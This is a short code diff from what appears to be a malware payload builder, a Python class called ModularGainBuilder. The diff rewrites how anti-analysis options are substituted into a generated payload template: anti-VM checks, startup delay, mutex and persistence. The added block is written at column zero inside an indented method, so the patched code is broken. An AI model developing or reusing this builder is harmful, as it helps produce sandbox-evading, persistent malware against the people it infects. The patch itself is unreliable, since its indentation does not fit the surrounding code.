@@ -275,22 +275,21 @@ class ModularGainBuilder:
                 final_code += config_code + "\n\n"
             
             # 3. Anti-analysis (with conditions)
-            if 'anti_analysis' in self.modules:
-                anti_code = self.modules['anti_analysis']
-                
-                # Replace condition placeholders
-                replacements = {
-                    "{ANTI_VM}": str(self.anti_analysis['anti_vm'].get()).lower(),
-                    "{STARTUP_DELAY}": str(self.anti_analysis['startup_delay'].get()).lower(),
-                    "{DELAY_SECONDS}": str(self.anti_analysis['delay_seconds'].get()),
-                    "{MUTEX}": str(self.anti_analysis['mutex'].get()).lower(),
-                    "{PERSIST}": str(self.anti_analysis['persist'].get()).lower()
-                }
-                
-                for placeholder, value in replacements.items():
-                    anti_code = anti_code.replace(placeholder, value)
-                
-                final_code += anti_code + "\n\n"
+if 'anti_analysis' in self.modules:
+    anti_code = self.modules['anti_analysis']
+    
+    bool_values = {
+        "{MUTEX}": "True" if self.anti_analysis['mutex'].get() else "False",
+        "{ANTI_VM}": "True" if self.anti_analysis['anti_vm'].get() else "False",
+        "{STARTUP_DELAY}": "True" if self.anti_analysis['startup_delay'].get() else "False",
+        "{DELAY_SECONDS}": str(self.anti_analysis['delay_seconds'].get()),
+        "{PERSIST}": "True" if self.anti_analysis['persist'].get() else "False"
+    }
+    
+    for placeholder, value in bool_values.items():
+        anti_code = anti_code.replace(placeholder, value)
+    
+    final_code += anti_code + "\n\n"
             
             # 4. Feature modules (only if enabled)
             feature_modules = [
